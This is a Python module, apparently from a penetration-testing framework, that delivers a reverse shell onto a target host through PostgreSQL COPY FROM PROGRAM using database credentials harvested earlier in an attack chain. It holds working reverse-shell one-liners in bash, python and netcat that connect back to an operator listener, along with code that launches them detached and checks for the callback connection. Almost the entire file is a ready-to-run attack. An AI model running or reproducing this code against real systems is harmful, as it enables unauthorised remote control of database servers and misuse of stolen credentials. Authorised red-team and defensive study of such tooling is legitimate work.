"""Payload delivery — reverse shell executed on the TARGET host.

The previous version of this module had the logic backwards: it opened a
socket **from the operator's own machine** back to ``lhost`` (default
``127.0.0.1`` — itself) and handed whoever was listening a shell on the
pentester's workstation.  It also required a Vault token it never used,
and reported ``success`` unconditionally after ``time.sleep(1)`` even when
the connect had failed inside the daemon thread.

Corrected design — the payload runs on the **target**, never locally:

1. Database credentials are collected from the attack chain (same sources
   as :mod:`pivot_engine`: global store, context findings, exfil leaks).
2. The module connects to PostgreSQL and requires SUPERUSER /
   ``pg_execute_server_program`` (the ``COPY FROM PROGRAM`` RCE channel).
3. A reverse-shell one-liner is launched **detached** on the target so
   ``COPY FROM PROGRAM`` returns immediately; the shell connects back to
   the operator's listener at ``lhost:lport``.
4. Success is only reported when delivery is confirmed — and, when
   possible, an established connection back to the listener is observed
   on the target's socket table.

Prerequisite: start a listener first, e.g. ``nc -lvnp 4444``.
"""

from __future__ import annotations

from typing import Optional

from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel
from . import pivot_engine


# Reverse-shell one-liners, executed on the TARGET via COPY FROM PROGRAM.
# {lhost}/{lport} = operator listener, reachable from the target network.
_PAYLOAD_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "python": (
        "python3 -c 'import socket,os,pty;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
        "pty.spawn(\"/bin/bash\")'"
    ),
    "nc": (
        "rm -f /tmp/.rsf; mkfifo /tmp/.rsf; "
        "cat /tmp/.rsf | /bin/bash -i 2>&1 | nc {lhost} {lport} > /tmp/.rsf"
    ),
}

_LOOPBACK = {"127.0.0.1", "localhost", "::1", "0.0.0.0"}


class PayloadModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="payload_module.reverse_shell",
            title="Payload - Reverse Shell (target-side delivery)",
            risk_level=RiskLevel.DESTRUCTIVE,
            domain="pivot",
            description=(
                "Delivers a reverse shell payload onto the TARGET host via the "
                "PostgreSQL COPY FROM PROGRAM channel established by the "
                "Vault -> DB pivot chain. The shell runs on the target and "
                "connects back to the operator listener at lhost:lport."
            ),
            default_enabled=False,
        )

    def can_run(self, context):
        """Requires DB credentials from the chain — not a Vault token.

        The payload is delivered through the database host, so what matters
        is having harvested credentials with a path to COPY FROM PROGRAM.
        """
        return bool(pivot_engine._collect_db_credentials(context))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        params = params or {}
        lhost = str(params.get("lhost", "") or "").strip()
        lport = int(params.get("lport", 4444))
        payload_type = str(params.get("payload_type", "bash")).lower()
        db_name = params.get("db_name", "postgres")
        timeout = int(params.get("timeout", 15))

        # ── Guard: lhost is interpreted ON THE TARGET ──────────────────
        # 127.0.0.1/localhost would point the shell back at the target
        # itself — the classic mistake this module previously baked in.
        if not lhost or lhost in _LOOPBACK:
            return ExecutionResult(
                status="blocked",
                message=(
                    "lhost must be the operator listener address reachable FROM "
                    "THE TARGET (loopback would point the shell at the target "
                    "itself). Pass lhost=<your listener IP> and start a listener "
                    "first, e.g. `nc -lvnp <lport>`."
                ),
                evidence={"missing": ["lhost"]},
            )

        template = _PAYLOAD_TEMPLATES.get(payload_type)
        if template is None:
            return ExecutionResult(
                status="error",
                message=(
                    f"Unsupported payload type '{payload_type}'. "
                    f"Choose one of: {sorted(_PAYLOAD_TEMPLATES)}"
                ),
                evidence={"supported": sorted(_PAYLOAD_TEMPLATES)},
            )
        payload_cmd = template.format(lhost=lhost, lport=lport)

        # ── Credentials: explicit params first, then chain-sourced ─────
        creds = []
        if params.get("username") and params.get("password"):
            creds.append({
                "username": params["username"],
                "password": params["password"],
                "host": params.get("db_host", ""),
                "port": params.get("db_port", 5432),
                "source": "explicit_params",
            })
        creds.extend(pivot_engine._collect_db_credentials(context))

        if not creds:
            return ExecutionResult(
                status="skipped",
                message=(
                    "No database credentials available. Run "
                    "database_credential_harvest.dynamic_creds first or pass "
                    "username/password params."
                ),
                evidence={"missing": ["db_credentials"]},
            )

        errors: list[str] = []
        for cred in creds:
            username = cred.get("username", "")
            password = cred.get("password", "")
            host = cred.get("host") or params.get("db_host") or "localhost"
            port = int(cred.get("port") or 5432)
            if not (username and password):
                continue

            conn = pivot_engine._pg_connect(host, port, db_name, username, password, timeout)
            if not conn:
                errors.append(f"{username}@{host}:{port}: connection failed")
                continue

            try:
                privs = pivot_engine._pg_check_privileges(conn, username)
                if not privs.get("can_copy_program"):
                    errors.append(
                        f"{username}@{host}:{port}: no COPY FROM PROGRAM "
                        "privilege (needs SUPERUSER or pg_execute_server_program)"
                    )
                    continue

                # Launch detached so COPY FROM PROGRAM returns immediately
                # instead of blocking on the long-lived shell process.
                delivery = f"nohup {payload_cmd} >/dev/null 2>&1 & echo PAYLOAD_LAUNCHED"
                out = pivot_engine._pg_capture_command_output(conn, delivery, timeout)
                if "PAYLOAD_LAUNCHED" not in out:
                    errors.append(
                        f"{username}@{host}:{port}: delivery failed: {out[:120]}"
                    )
                    continue

                # Best-effort confirmation: is there an established connection
                # from the target back to the listener port?
                check = pivot_engine._pg_capture_command_output(
                    conn,
                    f"ss -tn 2>/dev/null | grep ':{lport}' || "
                    f"netstat -tn 2>/dev/null | grep ':{lport}' || true",
                    timeout,
                )
                connected = bool(check and not check.startswith("[capture failed"))

                evidence = {
                    "target_host": host,
                    "target_port": port,
                    "db_user": username,
                    "payload_type": payload_type,
                    "lhost": lhost,
                    "lport": lport,
                    "callback_confirmed": connected,
                    "delivery": "postgres COPY FROM PROGRAM (detached)",
                }
                context.add_finding(
                    title="CRITICAL: Reverse Shell Delivered to Target Host",
                    description=(
                        f"Reverse shell payload launched ON target host "
                        f"{host} via PostgreSQL COPY FROM PROGRAM as DB user "
                        f"'{username}'. Shell calls back to {lhost}:{lport}. "
                        + (
                            "Callback connection observed on the target."
                            if connected
                            else "Callback not yet observed — check your listener."
                        )
                    ),
                    severity="CRITICAL",
                    evidence=evidence,
                )
                return ExecutionResult(
                    status="success",
                    message=(
                        f"Reverse shell delivered to target {host} "
                        f"(callback {lhost}:{lport}"
                        + (", connection confirmed)." if connected else " — awaiting callback).")
                    ),
                    evidence=evidence,
                )
            finally:
                try:
                    conn.close()
                except Exception:
                    pass

        return ExecutionResult(
            status="failed",
            message=(
                f"Could not deliver payload through any of "
                f"{len(errors)} credential candidate(s)."
            ),
            evidence={"errors": errors},
        )
